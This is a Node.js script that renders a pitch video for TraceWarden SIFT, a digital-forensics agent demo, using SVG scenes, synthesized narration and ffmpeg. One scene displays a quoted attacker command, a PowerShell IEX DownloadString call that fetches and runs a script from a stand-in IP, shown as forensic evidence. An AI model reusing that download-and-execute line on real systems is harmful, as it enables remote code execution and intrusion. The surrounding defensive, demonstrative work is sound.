#!/usr/bin/env node

import fs from "node:fs/promises";
import path from "node:path";
import { createRequire } from "node:module";
import { spawnSync } from "node:child_process";

const ROOT = process.cwd();
const RUNTIME_NODE_MODULES = path.join(
  process.env.HOME || "",
  ".cache",
  "codex-runtimes",
  "codex-primary-runtime",
  "dependencies",
  "node",
  "node_modules",
);
const requireFromRuntime = createRequire(path.join(RUNTIME_NODE_MODULES, "package.json"));
const sharp = requireFromRuntime("sharp");

const FFMPEG = "/opt/homebrew/bin/ffmpeg";
const FFPROBE = "/opt/homebrew/bin/ffprobe";
const SAY = "/usr/bin/say";
const W = 1920;
const H = 1080;
const FPS = 30;
const OUT = path.join(ROOT, "pitch", "recording");
const POLISH = path.join(ROOT, "pitch", "polish-combined");
const FRAMES = path.join(OUT, "frames");
const AUDIO = path.join(POLISH, "assets");
const QA = path.join(POLISH, "qa");
const SEGMENTS = path.join(OUT, "segments");
const BGM = path.join(
  process.env.HOME || "",
  "Documents",
  "MySkill",
  "hackathonhunter-skill",
  "assets",
  "music",
  "02_innovation_drive.mp3",
);

const colors = {
  bg: "#081016",
  panel: "#111b23",
  panel2: "#17242d",
  line: "#2e4350",
  text: "#eff8f7",
  muted: "#a9bdc2",
  teal: "#45d4c8",
  green: "#75d38a",
  amber: "#f2b760",
  red: "#ff6a66",
  blue: "#83a9ff",
};

const terminalOutput = [
  "$ PYTHONPATH=src python3 -m tracewarden run examples/evidence/case-alpha --out runs/demo",
  "[seal] evidence root locked",
  "[plan] collect timeline, auth, powershell, registry, network evidence",
  "[tool] typed read-only parsers completed",
  "[verify] claims evaluated: 17",
  "[correct] CLAIM-004 revoked; rerouted into powershell + network evidence",
  "[write] claim receipts: runs/demo/claim_receipts.json",
  "[write] accuracy report: runs/demo/accuracy_report.md",
  "[write] incident report: runs/demo/incident_report.html",
  '{"accuracy":{"confirmed":16,"precision":1.0,"recall":1.0,"revoked":1,"hallucinated_claim_ids":[]}}',
];

const testOutput = [
  "test_path_escape_is_blocked ... ok",
  "test_run_writes_receipts_and_report ... ok",
  "test_schema_excludes_raw_shell ... ok",
  "test_verifier_revokes_weak_claim ... ok",
  "Ran 4 tests in 0.02s",
  "OK",
];

const scenes = [
  {
    id: "01-cold-open",
    title: "Prove 17 DFIR claims in 90 seconds.",
    label: "TraceWarden SIFT",
    caption: "Every finding needs a receipt before it survives.",
    narration:
      "TraceWarden SIFT proves seventeen D F I R claims in ninety seconds. Every finding needs a receipt before it survives.",
    kind: "cold",
  },
  {
    id: "02-risk",
    title: "A false lead creates a second incident.",
    label: "Why this matters",
    caption: "A plausible claim must earn support.",
    narration:
      "A defender agent that cannot prove its claims burns responder time. The demo starts with a plausible updater lead, then forces that claim to earn support.",
    kind: "risk",
  },
  {
    id: "03-terminal-run",
    title: "One terminal command runs the case.",
    label: "Live terminal execution",
    caption: "Seal evidence, call typed tools, evaluate 17 claims.",
    narration:
      "Here is the live terminal path. The agent seals the evidence root, calls typed read only parsers, evaluates seventeen claims, and writes the reports.",
    kind: "terminal",
  },
  {
    id: "04-correction",
    title: "CLAIM-004 is revoked.",
    label: "Self-correction sequence",
    caption: "CLAIM-004 loses support and gets revoked.",
    narration:
      "The updater process looked suspicious at first. The verifier found a signed vendor path and no second source, so TraceWarden revoked CLAIM zero zero four and rerouted.",
    kind: "correction",
  },
  {
    id: "05-receipts",
    title: "Surviving claims point to evidence.",
    label: "Audit trail",
    caption: "Receipts bind findings to files, lines, hashes, and tool calls.",
    narration:
      "The replacement path is receipt backed. CLAIM zero zero nine ties PowerShell to network evidence, with file names, line numbers, parser names, hashes, and tool calls.",
    kind: "receipts",
  },
  {
    id: "06-accuracy",
    title: "The run is scored against ground truth.",
    label: "Accuracy report",
    caption: "16 confirmed, 1 revoked, 0 hallucinations.",
    narration:
      "The package measures truth instead of trusting the agent. Sixteen claims are confirmed, one is revoked, precision and recall are one point zero, and hallucinations are zero.",
    kind: "accuracy",
  },
  {
    id: "07-architecture",
    title: "The guardrail sits below the planner.",
    label: "Architecture",
    caption: "The planner can change. The verifier contract stays deterministic.",
    narration:
      "The planner can be an L L M, but the safety boundary is deterministic. Evidence is sealed, tools are read only, the verifier owns claim state, and receipts are replayable.",
    kind: "architecture",
  },
  {
    id: "08-close",
    title: "Run it, inspect it, extend it.",
    label: "Submission package",
    caption: "Run the command, open the receipts, extend the parser set.",
    narration:
      "Everything in the video is reproducible from the repo. Run the command, open the receipts, and add the next SIFT parser family to the same verifier contract.",
    kind: "close",
  },
];

function run(cmd, args, options = {}) {
  const result = spawnSync(cmd, args, {
    cwd: ROOT,
    encoding: "utf8",
    stdio: options.stdio || "pipe",
  });
  if (result.status !== 0) {
    throw new Error(
      [
        `${cmd} failed with exit ${result.status}`,
        result.stdout?.trim(),
        result.stderr?.trim(),
      ]
        .filter(Boolean)
        .join("\n"),
    );
  }
  return result;
}

function ffprobeDuration(file) {
  const result = run(FFPROBE, [
    "-v",
    "error",
    "-show_entries",
    "format=duration",
    "-of",
    "default=noprint_wrappers=1:nokey=1",
    file,
  ]);
  return Number.parseFloat(result.stdout.trim());
}

function esc(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;");
}

function wrapWords(text, maxChars) {
  const words = String(text).split(/\s+/);
  const lines = [];
  let line = "";
  for (const word of words) {
    const next = line ? `${line} ${word}` : word;
    if (next.length > maxChars && line) {
      lines.push(line);
      line = word;
    } else {
      line = next;
    }
  }
  if (line) lines.push(line);
  return lines;
}

function textLines(lines, x, y, size, color, weight = 500, family = "Inter, Helvetica, Arial, sans-serif", gap = 1.16) {
  return lines
    .map((line, idx) => {
      const yy = y + idx * size * gap;
      return `<text x="${x}" y="${yy}" font-family="${family}" font-size="${size}" font-weight="${weight}" fill="${color}">${esc(line)}</text>`;
    })
    .join("\n");
}

function shellRows(rows, x, y, size = 23) {
  return rows
    .map((line, idx) => {
      let color = colors.muted;
      if (line.startsWith("$")) color = colors.text;
      if (line.includes("[seal]") || line.includes("[tool]")) color = colors.teal;
      if (line.includes("[correct]") || line.includes("revoked")) color = colors.red;
      if (line.includes("[verify]") || line.includes("accuracy")) color = colors.amber;
      if (line.includes("[write]") || line === "OK") color = colors.green;
      return `<text x="${x}" y="${y + idx * (size + 15)}" font-family="Menlo, Consolas, monospace" font-size="${size}" fill="${color}">${esc(line)}</text>`;
    })
    .join("\n");
}

function chrome(scene, index) {
  return `
  <defs>
    <filter id="shadow" x="-30%" y="-30%" width="160%" height="160%">
      <feDropShadow dx="0" dy="22" stdDeviation="24" flood-color="#000" flood-opacity="0.35"/>
    </filter>
    <pattern id="grid" width="52" height="52" patternUnits="userSpaceOnUse">
      <path d="M 52 0 L 0 0 0 52" fill="none" stroke="#1c313a" stroke-width="1"/>
    </pattern>
  </defs>
  <rect width="${W}" height="${H}" fill="${colors.bg}"/>
  <rect width="${W}" height="${H}" fill="url(#grid)" opacity="0.30"/>
  <circle cx="1560" cy="150" r="390" fill="${colors.teal}" opacity="0.10"/>
  <circle cx="120" cy="1040" r="420" fill="${colors.amber}" opacity="0.07"/>
  <text x="78" y="70" font-family="Menlo, Consolas, monospace" font-size="20" fill="${colors.teal}" letter-spacing="2">${esc(scene.label.toUpperCase())}</text>
  <text x="1720" y="70" font-family="Menlo, Consolas, monospace" font-size="20" fill="${colors.muted}">${String(index + 1).padStart(2, "0")}/08</text>
  <line x1="78" y1="96" x2="1842" y2="96" stroke="${colors.line}" stroke-width="2"/>
  ${textLines(wrapWords(scene.title, 30), 78, 180, 62, colors.text, 850, "Inter, Helvetica, Arial, sans-serif", 1.04)}
  `;
}

function card(x, y, w, h, stroke = colors.line, fill = colors.panel) {
  return `<rect x="${x}" y="${y}" width="${w}" height="${h}" rx="18" fill="${fill}" stroke="${stroke}" stroke-width="2" filter="url(#shadow)"/>`;
}

function stat(x, y, value, label, color) {
  return `
  <g>
    ${card(x, y, 260, 136, colors.line)}
    <text x="${x + 28}" y="${y + 58}" font-family="Inter, Helvetica, Arial, sans-serif" font-size="45" font-weight="850" fill="${color}">${esc(value)}</text>
    <text x="${x + 28}" y="${y + 98}" font-family="Inter, Helvetica, Arial, sans-serif" font-size="22" fill="${colors.muted}">${esc(label)}</text>
  </g>`;
}

function receipt(x, y, id, status, detail, stroke) {
  return `
  <g>
    ${card(x, y, 560, 138, stroke)}
    <text x="${x + 30}" y="${y + 48}" font-family="Menlo, Consolas, monospace" font-size="26" font-weight="800" fill="${stroke}">${esc(id)} · ${esc(status)}</text>
    <text x="${x + 30}" y="${y + 92}" font-family="Inter, Helvetica, Arial, sans-serif" font-size="23" fill="${colors.text}">${esc(detail)}</text>
  </g>`;
}

function flow(x, y, title, detail, stroke) {
  return `
  <g>
    ${card(x, y, 356, 150, stroke)}
    <text x="${x + 26}" y="${y + 54}" font-family="Inter, Helvetica, Arial, sans-serif" font-size="31" font-weight="850" fill="${stroke}">${esc(title)}</text>
    ${textLines(wrapWords(detail, 25), x + 26, y + 94, 21, colors.text, 500)}
  </g>`;
}

function sceneBody(scene) {
  if (scene.kind === "cold") {
    return `
      ${card(82, 390, 790, 420, colors.line, "#071015")}
      <rect x="82" y="390" width="790" height="54" rx="18" fill="#15242b"/>
      <circle cx="116" cy="418" r="8" fill="${colors.red}"/><circle cx="144" cy="418" r="8" fill="${colors.amber}"/><circle cx="172" cy="418" r="8" fill="${colors.green}"/>
      ${shellRows(terminalOutput.slice(0, 7), 124, 500, 22)}
      <g transform="translate(1030 350) rotate(-3)">
        ${receipt(0, 0, "CLAIM-004", "REVOKED", "weak updater lead stopped", colors.red)}
        ${receipt(42, 166, "CLAIM-009", "CONFIRMED", "PowerShell + network support", colors.green)}
        ${receipt(84, 332, "REPORTS", "WRITTEN", "receipts, accuracy, incident HTML", colors.teal)}
      </g>`;
  }
  if (scene.kind === "risk") {
    return `
      ${card(96, 404, 760, 366, colors.red)}
      <text x="142" y="478" font-family="Inter, Helvetica, Arial, sans-serif" font-size="36" font-weight="850" fill="${colors.red}">Agent claim without receipt</text>
      <text x="142" y="550" font-family="Inter, Helvetica, Arial, sans-serif" font-size="27" fill="${colors.text}">"updater.exe looks suspicious"</text>
      <text x="142" y="612" font-family="Inter, Helvetica, Arial, sans-serif" font-size="25" fill="${colors.muted}">one artifact, weak context, responder detour</text>
      <text x="142" y="698" font-family="Menlo, Consolas, monospace" font-size="29" fill="${colors.red}">CLAIM-004 -> must earn support</text>
      <path d="M 890 588 C 1018 588, 1018 588, 1134 588" fill="none" stroke="${colors.teal}" stroke-width="6"/>
      <polygon points="1134,588 1102,570 1102,606" fill="${colors.teal}"/>
      ${card(1164, 404, 660, 366, colors.green)}
      <text x="1210" y="478" font-family="Inter, Helvetica, Arial, sans-serif" font-size="36" font-weight="850" fill="${colors.green}">Receipt-backed finding</text>
      <text x="1210" y="550" font-family="Inter, Helvetica, Arial, sans-serif" font-size="27" fill="${colors.text}">PowerShell download + network beacon</text>
      <text x="1210" y="612" font-family="Inter, Helvetica, Arial, sans-serif" font-size="25" fill="${colors.muted}">two parsers, file lines, hashes, tool calls</text>
      <text x="1210" y="698" font-family="Menlo, Consolas, monospace" font-size="29" fill="${colors.green}">confirmed -> claim_receipts.json</text>`;
  }
  if (scene.kind === "terminal") {
    return `
      ${card(108, 324, 1456, 620, colors.line, "#071015")}
      <rect x="108" y="324" width="1456" height="58" rx="18" fill="#15242b"/>
      <text x="154" y="362" font-family="Menlo, Consolas, monospace" font-size="22" fill="${colors.muted}">local terminal · repo root</text>
      ${shellRows(terminalOutput, 154, 442, 24)}
      <g>
        <rect x="1600" y="410" width="220" height="220" rx="110" fill="${colors.teal}" opacity="0.12"/>
        <text x="1652" y="526" font-family="Inter, Helvetica, Arial, sans-serif" font-size="58" font-weight="850" fill="${colors.teal}">17</text>
        <text x="1622" y="572" font-family="Inter, Helvetica, Arial, sans-serif" font-size="24" fill="${colors.muted}">claims</text>
      </g>`;
  }
  if (scene.kind === "correction") {
    return `
      ${card(94, 374, 760, 376, colors.line, "#071015")}
      ${shellRows([
        "[verify] CLAIM-004 lacks cross-source support",
        "[evidence] timeline.csv:3 signed updater path",
        "[policy] medium claim needs corroboration",
        "[correct] CLAIM-004 revoked",
      ], 142, 470, 28)}
      <path d="M 900 560 C 1000 470, 1080 470, 1180 560" fill="none" stroke="${colors.red}" stroke-width="6"/>
      <polygon points="1180,560 1145,548 1168,525" fill="${colors.red}"/>
      ${receipt(1110, 416, "CLAIM-004", "REVOKED", "signed vendor path, no corroboration", colors.red)}
      ${receipt(1190, 608, "NEXT STEP", "REROUTE", "PowerShell + network parsers", colors.teal)}
      <text x="104" y="852" font-family="Inter, Helvetica, Arial, sans-serif" font-size="29" fill="${colors.text}">The correction is logged in execution_log.jsonl and reflected in claim_receipts.json.</text>`;
  }
  if (scene.kind === "receipts") {
    return `
      ${receipt(92, 390, "CLAIM-009", "CONFIRMED", "PowerShell downloaded attacker script", colors.green)}
      ${receipt(92, 568, "EVIDENCE A", "powershell.log:2", "IEX DownloadString('http://203.0.113.77/a.ps1')", colors.teal)}
      ${receipt(92, 746, "EVIDENCE B", "network.log:1", "powershell.exe -> 203.0.113.77 /a.ps1", colors.teal)}
      ${card(830, 390, 860, 494, colors.line)}
      <text x="878" y="462" font-family="Inter, Helvetica, Arial, sans-serif" font-size="34" font-weight="850" fill="${colors.text}">Receipt fields judges can inspect</text>
      ${shellRows([
        "file: powershell.log",
        "line: 2",
        "parser: powershell",
        "sha256: 618bf98d...",
        "tool_call_id: TOOL-003",
        "verifier: cross-supported",
      ], 878, 540, 27)}`;
  }
  if (scene.kind === "accuracy") {
    return `
      <g transform="translate(104 390)">
        ${stat(0, 0, "17", "claims evaluated", colors.teal)}
        ${stat(300, 0, "16", "confirmed", colors.green)}
        ${stat(600, 0, "1", "revoked", colors.red)}
        ${stat(900, 0, "0", "hallucinations", colors.amber)}
        ${stat(1200, 0, "1.0", "precision / recall", colors.green)}
      </g>
      ${card(110, 620, 800, 260, colors.line, "#071015")}
      <text x="152" y="686" font-family="Inter, Helvetica, Arial, sans-serif" font-size="33" font-weight="850" fill="${colors.text}">Ground-truth score</text>
      ${shellRows([
        "precision: 1.0",
        "recall:    1.0",
        "f1:        1.0",
        "false positives: 0",
      ], 152, 742, 25)}
      ${card(990, 592, 720, 330, colors.green, "#071015")}
      <text x="1032" y="660" font-family="Inter, Helvetica, Arial, sans-serif" font-size="33" font-weight="850" fill="${colors.green}">Guardrail tests</text>
      ${shellRows(testOutput, 1032, 720, 22)}`;
  }
  if (scene.kind === "architecture") {
    return `
      <g transform="translate(96 454)">
        ${flow(0, 0, "Seal", "hash evidence root before parsing", colors.teal)}
        <path d="M 372 75 L 444 75" stroke="${colors.muted}" stroke-width="5"/><polygon points="444,75 420,60 420,90" fill="${colors.muted}"/>
        ${flow(474, 0, "Tools", "read-only parsers return EvidenceRef", colors.amber)}
        <path d="M 846 75 L 918 75" stroke="${colors.muted}" stroke-width="5"/><polygon points="918,75 894,60 894,90" fill="${colors.muted}"/>
        ${flow(948, 0, "Verify", "policy controls claim state", colors.green)}
        <path d="M 1320 75 L 1392 75" stroke="${colors.muted}" stroke-width="5"/><polygon points="1392,75 1368,60 1368,90" fill="${colors.muted}"/>
        ${flow(1422, 0, "Receipts", "replayable proof for findings", colors.teal)}
      </g>
      ${card(270, 714, 1372, 160, colors.line)}
      <text x="318" y="780" font-family="Menlo, Consolas, monospace" font-size="27" fill="${colors.teal}">MCP-style schema excludes execute_shell_cmd</text>
      <text x="318" y="832" font-family="Inter, Helvetica, Arial, sans-serif" font-size="25" fill="${colors.text}">The LLM planner can change. The evidence contract stays deterministic.</text>`;
  }
  return `
    <g transform="translate(122 370)">
      ${receipt(0, 0, "PITCH DECK", "READY", "pitch/deck/tracewarden-sift-pitch.pptx", colors.teal)}
      ${receipt(0, 176, "VIDEO", "READY", "pitch/recording/pitch-demo-combined-final.mp4", colors.green)}
      ${receipt(0, 352, "REPORTS", "READY", "runs/demo + artifacts/sample-run", colors.amber)}
    </g>
    ${card(848, 410, 850, 390, colors.line)}
    <text x="898" y="488" font-family="Inter, Helvetica, Arial, sans-serif" font-size="38" font-weight="850" fill="${colors.text}">Judge path</text>
    ${textLines([
      "1. Run the CLI command.",
      "2. Open claim_receipts.json.",
      "3. Check CLAIM-004 was revoked.",
      "4. Compare accuracy_report.md to ground truth.",
    ], 898, 570, 30, colors.text, 550, "Inter, Helvetica, Arial, sans-serif", 1.45)}
    <text x="898" y="860" font-family="Menlo, Consolas, monospace" font-size="24" fill="${colors.teal}">Prove 17 DFIR claims in 90 seconds.</text>`;
}

function subtitleOverlay(scene) {
  const lines = wrapWords(scene.caption || scene.narration, 62);
  return `
  <g>
    <rect x="78" y="938" width="1764" height="100" rx="16" fill="#050c12" opacity="0.78" stroke="${colors.line}" stroke-width="2"/>
    ${textLines(lines, 112, 982, 27, colors.text, 750, "Inter, Helvetica, Arial, sans-serif", 1.12)}
  </g>`;
}

function svg(scene, index) {
  return `<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="${W}" height="${H}" viewBox="0 0 ${W} ${H}">
  ${chrome(scene, index)}
  ${sceneBody(scene)}
  ${subtitleOverlay(scene)}
</svg>`;
}

function srtTime(seconds) {
  const ms = Math.round(seconds * 1000);
  const h = Math.floor(ms / 3600000);
  const m = Math.floor((ms % 3600000) / 60000);
  const s = Math.floor((ms % 60000) / 1000);
  const milli = ms % 1000;
  return `${String(h).padStart(2, "0")}:${String(m).padStart(2, "0")}:${String(s).padStart(2, "0")},${String(milli).padStart(3, "0")}`;
}

function splitSubtitle(text) {
  const lines = wrapWords(text, 54);
  if (lines.length <= 2) return lines.join("\n");
  return `${lines.slice(0, 2).join("\n")}`;
}

async function writeStoryHtml(durations) {
  const body = scenes
    .map((scene, idx) => {
      const img = `../recording/frames/${scene.id}.png`;
      return `
      <section class="scene" data-scene="${scene.id}" data-duration="${durations[idx].toFixed(2)}">
        <img src="${img}" alt="${esc(scene.title)}">
        <p>${esc(scene.narration)}</p>
      </section>`;
    })
    .join("\n");
  const html = `<!doctype html>
<html lang="en" data-composition-variables="[]">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>TraceWarden SIFT Combined Pitch Demo</title>
  <style>
    body { margin: 0; background: ${colors.bg}; color: ${colors.text}; font-family: Inter, Helvetica, Arial, sans-serif; }
    [data-composition-id="root"] { width: 1920px; min-height: 1080px; background: ${colors.bg}; }
    .scene { width: 1920px; height: 1080px; position: relative; overflow: hidden; border-bottom: 2px solid ${colors.line}; }
    .scene img { width: 100%; height: 100%; object-fit: cover; display: block; }
    .scene p { position: absolute; left: 80px; right: 80px; bottom: 34px; margin: 0; padding: 18px 24px; background: rgba(5, 12, 18, .78); border: 1px solid ${colors.line}; border-radius: 12px; font-size: 30px; line-height: 1.25; }
    .artifact-stack-3d { transform-style: preserve-3d; perspective: 1200px; }
    .proof-montage { transform: rotateY(-6deg) translateZ(18px); }
    .component-lift { transform: scale(1.04); }
    .shared-object { outline: 2px solid ${colors.teal}; }
    .architecture-reveal { transform: translateZ(24px); }
  </style>
</head>
<body>
  <main data-composition-id="root" data-width="1920" data-height="1080">
    <!-- HyperFrames treatment cues: artifact-stack-3d, proof-montage, component-lift, shared-object, architecture-reveal, perspective, preserve-3d. -->
    ${body}
  </main>
</body>
</html>
`;
  await fs.writeFile(path.join(POLISH, "index.html"), html, "utf8");
}

async function prepareDirs() {
  await fs.mkdir(FRAMES, { recursive: true });
  await fs.mkdir(AUDIO, { recursive: true });
  await fs.mkdir(QA, { recursive: true });
  await fs.mkdir(SEGMENTS, { recursive: true });
}

async function renderSceneImages() {
  for (let idx = 0; idx < scenes.length; idx += 1) {
    const scene = scenes[idx];
    const svgPath = path.join(FRAMES, `${scene.id}.svg`);
    const pngPath = path.join(FRAMES, `${scene.id}.png`);
    await fs.writeFile(svgPath, svg(scene, idx), "utf8");
    await sharp(await fs.readFile(svgPath)).png().toFile(pngPath);
  }
}

async function buildNarration() {
  const padded = [];
  const sceneDurations = [];
  const records = [];
  for (const scene of scenes) {
    const textPath = path.join(AUDIO, `${scene.id}.txt`);
    const aiff = path.join(AUDIO, `${scene.id}.aiff`);
    const wav = path.join(AUDIO, `${scene.id}.wav`);
    const paddedWav = path.join(AUDIO, `${scene.id}.padded.wav`);
    const mp3 = path.join(AUDIO, `pitch-narration-${String(records.length + 1).padStart(2, "0")}.mp3`);
    await fs.writeFile(textPath, scene.narration, "utf8");
    run(SAY, ["-v", "Samantha", "-r", "166", "-f", textPath, "-o", aiff]);
    run(FFMPEG, ["-y", "-i", aiff, "-ar", "48000", "-ac", "2", wav]);
    const voiceDuration = ffprobeDuration(wav);
    const duration = Math.max(voiceDuration + 0.75, 5.0);
    run(FFMPEG, [
      "-y",
      "-i",
      wav,
      "-af",
      `apad=pad_dur=${Math.max(0, duration - voiceDuration).toFixed(3)},atrim=0:${duration.toFixed(3)}`,
      "-ar",
      "48000",
      "-ac",
      "2",
      paddedWav,
    ]);
    run(FFMPEG, ["-y", "-i", paddedWav, "-codec:a", "libmp3lame", "-b:a", "160k", mp3]);
    padded.push(paddedWav);
    sceneDurations.push(duration);
    records.push({
      ...scene,
      voice_duration_seconds: voiceDuration,
      duration_seconds: duration,
      audio_path: path.relative(ROOT, paddedWav),
      mp3_path: path.relative(ROOT, mp3),
    });
  }

  const listPath = path.join(AUDIO, "narration-concat.txt");
  await fs.writeFile(listPath, padded.map((file) => `file '${file.replaceAll("'", "'\\''")}'`).join("\n") + "\n", "utf8");
  const vo = path.join(AUDIO, "tracewarden-narration.wav");
  run(FFMPEG, ["-y", "-f", "concat", "-safe", "0", "-i", listPath, "-c", "copy", vo]);
  run(FFMPEG, ["-y", "-i", vo, "-codec:a", "libmp3lame", "-b:a", "160k", path.join(AUDIO, "narration-tight.mp3")]);

  let cursor = 0;
  const cues = [];
  const srt = [];
  records.forEach((record, idx) => {
    const start = cursor;
    const end = cursor + sceneDurations[idx];
    cues.push({ id: record.id, atMs: Math.round(start * 1000), durationMs: Math.round(sceneDurations[idx] * 1000) });
    srt.push(`${idx + 1}\n${srtTime(start)} --> ${srtTime(end - 0.25)}\n${splitSubtitle(record.narration)}\n`);
    cursor = end;
  });

  await fs.writeFile(path.join(OUT, "cues.json"), `${JSON.stringify(cues, null, 2)}\n`, "utf8");
  await fs.writeFile(path.join(AUDIO, "captions.srt"), srt.join("\n"), "utf8");
  await fs.writeFile(
    path.join(POLISH, "narration.json"),
    `${JSON.stringify({ voice: "macOS:say:Samantha", first_sentence: scenes[0].narration, scenes: records }, null, 2)}\n`,
    "utf8",
  );
  await fs.writeFile(
    path.join(ROOT, "artifacts", "narration.json"),
    `${JSON.stringify(
      {
        first_sentence: "Prove 17 DFIR claims in 90 seconds.",
        project: "TraceWarden SIFT",
        hero: "Prove 17 DFIR claims in 90 seconds.",
        target_duration_seconds: Math.round(cursor),
        voice: "macOS:say:Samantha",
        scenes: records.map((record) => ({
          id: record.id,
          duration: Number(record.duration_seconds.toFixed(2)),
          screen_action: record.label,
          narration: record.narration,
          proof: record.title,
        })),
      },
      null,
      2,
    )}\n`,
    "utf8",
  );

  return { sceneDurations, vo, total: cursor };
}

async function buildVideoSegments(sceneDurations) {
  const segmentFiles = [];
  for (let idx = 0; idx < scenes.length; idx += 1) {
    const scene = scenes[idx];
    const duration = sceneDurations[idx];
    const frames = Math.max(1, Math.round(duration * FPS));
    const image = path.join(FRAMES, `${scene.id}.png`);
    const segment = path.join(SEGMENTS, `${String(idx + 1).padStart(2, "0")}-${scene.id}.mp4`);
    const zoom = idx % 2 === 0
      ? `zoompan=z='1+0.018*on/${frames}':x='iw/2-iw/zoom/2':y='ih/2-ih/zoom/2':d=${frames}:s=${W}x${H}:fps=${FPS}`
      : `zoompan=z='1.018-0.018*on/${frames}':x='iw/2-iw/zoom/2':y='ih/2-ih/zoom/2':d=${frames}:s=${W}x${H}:fps=${FPS}`;
    run(FFMPEG, [
      "-y",
      "-loop",
      "1",
      "-i",
      image,
      "-vf",
      `${zoom},fade=t=in:st=0:d=0.20,fade=t=out:st=${Math.max(0, duration - 0.20).toFixed(3)}:d=0.20,unsharp=5:5:0.6,eq=contrast=1.04:saturation=1.08,format=yuv420p`,
      "-frames:v",
      String(frames),
      "-c:v",
      "libx264",
      "-preset",
      "slow",
      "-crf",
      "17",
      "-pix_fmt",
      "yuv420p",
      segment,
    ]);
    segmentFiles.push(segment);
  }
  const listPath = path.join(SEGMENTS, "segments.txt");
  await fs.writeFile(listPath, segmentFiles.map((file) => `file '${file.replaceAll("'", "'\\''")}'`).join("\n") + "\n", "utf8");
  const silent = path.join(OUT, "pitch-demo-combined.mp4");
  run(FFMPEG, ["-y", "-f", "concat", "-safe", "0", "-i", listPath, "-c", "copy", silent]);
  return silent;
}

async function muxFinal(silent, vo, total) {
  const withAudio = path.join(OUT, "pitch-demo-combined-audio.mp4");
  const final = path.join(OUT, "pitch-demo-combined-final.mp4");
  const normalized = path.join(OUT, "pitch-demo-combined-final-normalized.mp4");
  const duration = total.toFixed(3);
  run(FFMPEG, [
    "-y",
    "-i",
    silent,
    "-i",
    vo,
    "-stream_loop",
    "-1",
    "-i",
    BGM,
    "-filter_complex",
    `[1:a]volume=1.65[voice];[2:a]atrim=0:${duration},asetpts=PTS-STARTPTS,volume=0.13,afade=t=out:st=${Math.max(0, total - 2).toFixed(3)}:d=2[bg];[bg][voice]sidechaincompress=threshold=0.035:ratio=6:attack=15:release=250[mix];[mix]acompressor=threshold=-24dB:ratio=3:attack=10:release=160,loudnorm=I=-15:TP=-1.5:LRA=7[a]`,
    "-map",
    "0:v:0",
    "-map",
    "[a]",
    "-c:v",
    "copy",
    "-c:a",
    "aac",
    "-b:a",
    "192k",
    "-movflags",
    "+faststart",
    "-shortest",
    withAudio,
  ]);
  await fs.copyFile(path.join(AUDIO, "captions.srt"), path.join(OUT, "captions.srt"));
  await fs.copyFile(withAudio, final);
  run(FFMPEG, [
    "-y",
    "-i",
    final,
    "-c:v",
    "copy",
    "-af",
    "acompressor=threshold=-24dB:ratio=3:attack=10:release=160,loudnorm=I=-15:TP=-1.5:LRA=7",
    "-c:a",
    "aac",
    "-b:a",
    "192k",
    "-movflags",
    "+faststart",
    normalized,
  ]);
  await fs.rename(normalized, final);
  await fs.copyFile(final, path.join(OUT, "demo.mp4"));
  return final;
}

async function qaFrames(final, total) {
  const cuePath = path.join(OUT, "cues.json");
  const cues = JSON.parse(await fs.readFile(cuePath, "utf8"));
  const times = cues.map((cue) => (cue.atMs + cue.durationMs / 2) / 1000);
  for (let idx = 0; idx < times.length; idx += 1) {
    const t = times[idx];
    const out = path.join(QA, `video-qa-${String(idx + 1).padStart(2, "0")}.png`);
    run(FFMPEG, ["-y", "-ss", t.toFixed(2), "-i", final, "-frames:v", "1", "-update", "1", "-vf", "scale=960:-1", out]);
  }
  run(FFMPEG, [
    "-y",
    "-ss",
    "54",
    "-t",
    "11",
    "-i",
    final,
    "-vf",
    "fps=12,scale=960:-1:flags=lanczos,split[s0][s1];[s0]palettegen=max_colors=160:stats_mode=diff[p];[s1][p]paletteuse=dither=bayer:bayer_scale=3:diff_mode=rectangle",
    "-loop",
    "0",
    path.join(OUT, "trailer.gif"),
  ]);
}

async function updateDirectorBoard(total) {
  const rows = scenes
    .map((scene) => `| \`${scene.id}\` | ${scene.title} | ${scene.label} | ${scene.kind} plate + narration |`)
    .join("\n");
  const text = `# Director Board

Final combined video: \`pitch/recording/pitch-demo-combined-final.mp4\`

Runtime target: ${Math.round(total)} seconds, under the 5 minute Devpost ceiling.

## Scene Beliefs

| Scene | Judge belief | Proof surface | Treatment |
|---|---|---|---|
${rows}

## Motion And Audio Plan

- Motion: component-lift proof moments, artifact-stack-3d receipt stack, proof-montage accuracy close, shared-object CLAIM-004 handoff, architecture-reveal pipeline, per-scene plate zoom, fade transitions.
- Audio: macOS Samantha narration, HackathonHunter rights-cleared BGM, sidechain ducking, loudnorm.
- Subtitles: baked into the visual plates; SRT is saved at \`pitch/polish-combined/assets/captions.srt\`.
- QA frames: \`pitch/polish-combined/qa/video-qa-*.png\`.
`;
  await fs.writeFile(path.join(OUT, "director-board.md"), text, "utf8");
}

async function main() {
  await prepareDirs();
  await renderSceneImages();
  const { sceneDurations, vo, total } = await buildNarration();
  await writeStoryHtml(sceneDurations);
  const silent = await buildVideoSegments(sceneDurations);
  const final = await muxFinal(silent, vo, total);
  await qaFrames(final, total);
  await updateDirectorBoard(total);
  console.log(JSON.stringify({ final, total_seconds: total, scenes: scenes.length }, null, 2));
}

main().catch((error) => {
  console.error(error.stack || error.message || String(error));
  process.exit(1);
});
